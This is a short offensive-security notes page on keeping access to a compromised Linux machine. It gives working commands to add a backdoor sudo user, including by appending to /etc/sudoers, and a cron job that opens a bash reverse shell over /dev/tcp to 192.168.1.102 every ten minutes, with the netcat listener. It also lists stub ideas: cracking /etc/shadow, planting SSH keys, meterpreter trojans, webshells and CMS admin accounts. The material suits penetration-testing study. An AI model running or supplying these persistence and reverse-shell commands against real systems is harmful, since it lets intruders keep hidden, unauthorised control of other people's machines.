# Persistence - Rootkit - Backdoor

So if you manage to compromise a system the system might die for whatever reason. If you have used an exploit that messes with the machine the user might want to reboot, and if the user reboots you will lose your shell.

Or, maybe the way to compromise the machine is really complicated or noisy and you don't want to go through the hassle of doing it all again. So instead you just create a backdoor that you can enter fast and easy.

Read this
https://gist.github.com/dergachev/7916152

## Create a new user

The most obvious, but not so subtle way is to just create a new user (if you are root, or someone with that privilege) 

```
adduser pelle
adduser pelle sudo
```

Now if the machine has ssh you will be able to ssh into the machine.

On some machines, older linux I think, you have to do

```
useradd pelle
passwd pelle
echo "pelle    ALL=(ALL) ALL" >> /etc/sudoers
```

## Crack the password of existing user

Get the `/etc/shadow` file and crack the passwords.


## SSH key

Add key to exisitng ssh-account.


## Cronjob NC

Create cronjob that connects to my machine every 10 minutes. Here is an example using a bash-reverse-shell. You also need to set up a netcat listener.

```
crontab -e
*/10 * * * * 0<&196;exec 196<>/dev/tcp/192.168.1.102/5556; sh <&196 >&196 2>&196
```

```
nc -lvp 5556
```

### References:
http://kaoticcreations.blogspot.cl/2012/07/backdooring-unix-system-via-cron.html


## Binary trojan
Create a binary with malicious content inside. Run that, get meterpreter shell, run metasploit persistence.

https://www.offensive-security.com/metasploit-unleashed/binary-linux-trojan/

If you have a meterpreter shell you can easily just run persistence.

## Backdoor in webserver

You can put a cmd or shell-backdoor in a webserver.

Put backdoor on webserver, either in separate file or in hidden in another file

## Admin account to CMS

Add admin account to CMS.


## Mysql-backdoor

Mysql backdoor

## Hide backdoor in bootblock


## Nmap
https://gist.github.com/dergachev/7916152